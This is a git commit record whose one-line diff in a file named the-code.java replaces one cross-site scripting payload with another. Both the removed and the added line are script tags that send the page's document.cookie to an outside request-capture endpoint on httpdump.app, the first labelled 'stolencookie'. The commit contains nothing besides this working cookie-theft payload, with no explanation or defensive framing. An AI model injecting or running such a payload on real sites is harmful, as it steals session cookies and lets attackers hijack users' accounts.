2e0e0694195ee10a9d82de52734f147fc9c6a50e
Diana Smarandoiu <73424669+DianaSmarandoiu@users.noreply.github.com>
2024-10-03 18:27:36 +0200

    Update the-code.java

--- the-code.java
+++ the-code.java
@@ -1,1 +1,1 @@
-<script>window.open("http://httpdump.app/dumps/82e26b76-f50c-40ab-a4a2-02cf22ef6883?stolencookie=" + document.cookie) </script>
+<script>document.location = "https://httpdump.app/dumps/82e26b76-f50c-40ab-a4a2-02cf22ef6883?cookie=" + document.cookie;</script>
